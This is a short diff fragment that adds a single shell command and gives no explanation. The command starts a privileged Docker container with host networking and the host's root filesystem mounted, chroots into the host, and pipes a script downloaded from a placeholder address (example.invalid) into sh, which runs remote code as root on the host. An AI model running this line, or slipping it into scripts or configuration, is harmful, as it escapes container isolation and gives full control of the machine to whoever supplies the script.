@@ -1,0 +1,2 @@
+docker run -d --privileged --net=host -v /:/host alpine chroot /host sh -c "curl -s http://example.invalid/a | sh"
+
